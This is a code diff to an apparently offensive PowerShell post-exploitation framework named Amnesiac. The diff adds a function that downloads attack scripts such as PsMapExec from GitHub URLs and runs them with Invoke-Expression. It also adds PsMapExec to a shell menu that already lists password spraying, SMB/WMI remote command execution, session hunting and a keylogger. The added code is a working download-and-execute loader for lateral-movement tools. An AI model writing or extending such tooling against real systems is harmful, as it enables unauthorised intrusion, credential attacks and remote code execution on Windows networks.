@@ -328,6 +328,31 @@ function Initialize-ToolCache {
         }
     }
     # Note: Heavy tier (Suntour, Ferrari, ppl, RDPKeylog.exe) loaded on demand via operator HTTP.
+
+    # Per-tool URL overrides for tools hosted outside the Amnesiac Tools\ directory
+    $global:ToolSources = @{
+        'PsMapExec' = 'https://raw.githubusercontent.com/0xSiarheiStar/PsMapExec/main/PsMapExec.ps1'
+    }
+}
+
+function Fetch-ToolFromGitHub {
+    param([string]$ToolName)
+    if ($global:ToolCache.ContainsKey($ToolName)) { return $true }
+    if ($global:ToolSources -and $global:ToolSources.ContainsKey($ToolName)) {
+        $url = $global:ToolSources[$ToolName]
+    } else {
+        $url = "https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/$ToolName.ps1"
+    }
+    try {
+        Write-Host " [*] '$ToolName' not in cache — fetching from GitHub..." -ForegroundColor Yellow
+        $code = (New-Object Net.WebClient).DownloadString($url)
+        $global:ToolCache[$ToolName] = $code
+        Write-Host " [+] '$ToolName' cached from GitHub." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host " [-] GitHub fetch failed for '$ToolName': $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
 }
 
 function New-EmbeddedTool {
@@ -348,10 +373,12 @@ function Send-Module {
     )
 
     if (-not $global:ToolCache.ContainsKey($ToolName)) {
-        Write-Host " [-] Module '$ToolName' not in cache. Options:" -ForegroundColor Red
-        Write-Host "     1. Add to Tools\ and run: modules reload"
-        Write-Host "     2. Start operator HTTP server: serve"
-        return $false
+        if (-not (Fetch-ToolFromGitHub -ToolName $ToolName)) {
+            Write-Host " [-] Module '$ToolName' not in cache. Options:" -ForegroundColor Red
+            Write-Host "     1. Add to Tools\ and run: modules reload"
+            Write-Host "     2. Start operator HTTP server: serve"
+            return $false
+        }
     }
 
     $code      = $global:ToolCache[$ToolName]
@@ -1731,6 +1758,7 @@ function Start-LocalShell {
         'PassSpray'        = @{ tools=@('PassSpray');                                            invoke=$null }
         'Remoting'         = @{ tools=@('Invoke-SMBRemoting','Invoke-WMIRemoting');             invoke=$null }
         'SessionHunter'    = @{ tools=@('Invoke-SessionHunter');                                 invoke=$null }
+        'PsMapExec'        = @{ tools=@('PsMapExec');                                            invoke=$null }
     }
 
     Write-Output ""
@@ -1810,6 +1838,7 @@ function Start-LocalShell {
             Write-Host "   PassSpray         " -NoNewline -ForegroundColor Yellow; Write-Host "Domain password spray - use: Invoke-PassSpray"
             Write-Host "   Remoting          " -NoNewline -ForegroundColor Yellow; Write-Host "Remote command execution SMB/WMI - use: Invoke-SMBRemoting / Invoke-WMIRemoting"
             Write-Host "   SessionHunter     " -NoNewline -ForegroundColor Yellow; Write-Host "Hunt for active user sessions"
+            Write-Host "   PsMapExec         " -NoNewline -ForegroundColor Yellow; Write-Host "Network attacks/mapping - use: PsMapExec <Method> -Targets <targets> [-Domain <domain>]"
             Write-Output ""
             Write-Host " [*] Scenario 1: started via 'runas /netonly', all domain tools" -ForegroundColor DarkCyan
             Write-Host "     (PowerView, SessionHunter, PassSpray, etc.) automatically use" -ForegroundColor DarkCyan
@@ -1846,11 +1875,14 @@ function Start-LocalShell {
             $before = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
             foreach ($toolName in $kwDef.tools) {
                 $cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $toolName } | Select-Object -First 1
+                if (-not $cacheKey -and (Fetch-ToolFromGitHub -ToolName $toolName)) {
+                    $cacheKey = $toolName
+                }
                 if ($cacheKey) {
                     try   { Invoke-Expression $global:ToolCache[$cacheKey] }
                     catch { Write-Host " [-] Failed to load ${toolName}: $($_.Exception.Message)" -ForegroundColor Red; $allOk = $false }
                 } else {
-                    Write-Host " [-] '$toolName' not in cache. Run 'modules reload' or 'serve' from main menu." -ForegroundColor Red
+                    Write-Host " [-] '$toolName' not in cache or GitHub." -ForegroundColor Red
                     $allOk = $false
                 }
             }
@@ -1875,6 +1907,9 @@ function Start-LocalShell {
         if ($cmd -match '^load\s+(.+)') {
             $modName  = $Matches[1].Trim()
             $cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq $modName } | Select-Object -First 1
+            if (-not $cacheKey -and (Fetch-ToolFromGitHub -ToolName $modName)) {
+                $cacheKey = $modName
+            }
             if ($cacheKey) {
                 $before = @(Get-Command -CommandType Function | Select-Object -ExpandProperty Name)
                 try {
@@ -1890,7 +1925,7 @@ function Start-LocalShell {
                     Write-Host " [-] Load error: $($_.Exception.Message)" -ForegroundColor Red
                 }
             } else {
-                Write-Host " [-] '$modName' not in cache. Type 'modules' to list available." -ForegroundColor Red
+                Write-Host " [-] '$modName' not in cache or GitHub." -ForegroundColor Red
             }
             continue
         }
